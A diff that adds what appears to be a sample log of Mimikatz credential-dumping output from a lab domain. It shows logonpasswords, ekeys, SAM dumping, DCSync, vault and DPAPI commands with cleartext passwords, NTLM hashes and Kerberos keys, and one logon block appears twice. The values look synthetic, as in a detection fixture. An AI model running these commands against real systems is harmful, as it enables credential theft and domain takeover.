@@ -1,0 +1,233 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN10PC$
+Domain            : TESTLAB
+Logon Server      : (null)
+Logon Time        : 2024/06/15 10:30:00
+SID               : S-1-5-18
+	msv :
+	 [00000003] Primary
+	 * Username : WIN10PC$
+	 * Domain   : TESTLAB
+	 * NTLM     : aad3b435b51404eeaad3b435b51404ee
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg :
+	wdigest :
+	 * Username : WIN10PC$
+	 * Domain   : TESTLAB
+	 * Password : (null)
+	kerberos :
+	 * Username : WIN10PC$
+	 * Domain   : TESTLAB
+	 * Password : (null)
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 48212 (00000000:0000bc54)
+Session           : Interactive from 1
+User Name         : jsmith
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 08:15:32
+SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
+	msv :
+	 [00000003] Primary
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
+	 * SHA1     : a4f49c406510bdcab6824ee7c30fd852e32810d8
+	tspkg :
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * Password : P@ssw0rd123!
+	wdigest :
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * Password : P@ssw0rd123!
+	kerberos :
+	 * Username : jsmith
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : P@ssw0rd123!
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 48212 (00000000:0000bc54)
+Session           : Interactive from 1
+User Name         : jsmith
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 08:15:32
+SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
+	msv :
+	 [00000003] Primary
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
+	 * SHA1     : a4f49c406510bdcab6824ee7c30fd852e32810d8
+	tspkg :
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * Password : P@ssw0rd123!
+	wdigest :
+	 * Username : jsmith
+	 * Domain   : TESTLAB
+	 * Password : P@ssw0rd123!
+	kerberos :
+	 * Username : jsmith
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : P@ssw0rd123!
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 99610 (00000000:000184fa)
+Session           : Interactive from 2
+User Name         : admin
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 09:45:10
+SID               : S-1-5-21-1234567890-1234567890-1234567890-500
+	msv :
+	 [00000003] Primary
+	 * Username : admin
+	 * Domain   : TESTLAB
+	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42
+	 * SHA1     : 9054f23de69ace9ed3cd0fb2e0a328c764394785
+	tspkg :
+	wdigest :
+	 * Username : admin
+	 * Domain   : TESTLAB
+	 * Password : Adm1nP@ss!
+	kerberos :
+	 * Username : admin
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : Adm1nP@ss!
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 65432 (00000000:0000ff98)
+Session           : Service from 0
+User Name         : svc_backup
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 07:00:05
+SID               : S-1-5-21-1234567890-1234567890-1234567890-1105
+	msv :
+	 [00000003] Primary
+	 * Username : svc_backup
+	 * Domain   : TESTLAB
+	 * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
+	 * SHA1     : 2b28b5b4ea4f20fe8a7e7b3b15c8f3e5f0c1a2b3
+	tspkg :
+	wdigest :
+	 * Username : svc_backup
+	 * Domain   : TESTLAB
+	 * Password : (null)
+	kerberos :
+	 * Username : svc_backup
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+
+mimikatz # sekurlsa::ekeys
+
+Authentication Id : 0 ; 48212 (00000000:0000bc54)
+Session           : Interactive from 1
+User Name         : jsmith
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 08:15:32
+SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
+	 * Username : jsmith
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : (null)
+	 * Key List :
+	   aes256_hmac       4a8bc3f0e1d2a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
+	   aes128_hmac       a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+	   rc4_hmac_nt       32ed87bdb5fdc5e9cba88547376818d4
+
+Authentication Id : 0 ; 99610 (00000000:000184fa)
+Session           : Interactive from 2
+User Name         : admin
+Domain            : TESTLAB
+Logon Server      : DC01
+Logon Time        : 2024/06/15 09:45:10
+SID               : S-1-5-21-1234567890-1234567890-1234567890-500
+	 * Username : admin
+	 * Domain   : TESTLAB.LOCAL
+	 * Password : (null)
+	 * Key List :
+	   aes256_hmac       b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5d2e1f0c3b4a8
+	   aes128_hmac       d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1
+	   rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
+
+mimikatz # lsadump::sam
+
+Domain : TESTLAB
+SysKey : abcdef1234567890abcdef1234567890
+
+SAMKey : 1234567890abcdef1234567890abcdef
+
+RID  : 000001f4 (500)
+User : admin
+  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 000003e9 (1001)
+User : jsmith
+  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
+
+RID  : 000003ea (1002)
+User : svc_backup
+  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+
+mimikatz # lsadump::dcsync /user:admin
+
+[DC] 'TESTLAB.LOCAL' will be the domain
+[DC] 'DC01.TESTLAB.LOCAL' will be the DC server
+[DC] 'admin' will be the user account
+
+Object RDN           : admin
+
+** SAM ACCOUNT **
+
+SAMAccountName       : admin
+User Principal Name  : admin@TESTLAB.LOCAL
+
+Object Security ID   : S-1-5-21-1234567890-1234567890-1234567890-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TESTLAB.LOCALadmin
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5d2e1f0c3b4a8
+      aes128_hmac       (4096) : d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1
+
+mimikatz # vault::cred
+
+TargetName : Domain:target=DC01.TESTLAB.LOCAL
+UserName   : TESTLAB\dbadmin
+Comment    :
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Credential : Str0ngDBP@ss!
+
+TargetName : Domain:target=FILESERVER01
+UserName   : TESTLAB\jsmith
+Comment    :
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Credential : P@ssw0rd123!
+
+mimikatz # dpapi::cred
+
+ * volatile cache: GUID:{12345678-1234-1234-1234-123456789012}
+   * username : backupadmin
+   * domain   : TESTLAB
+   * password : B@ckup2024!
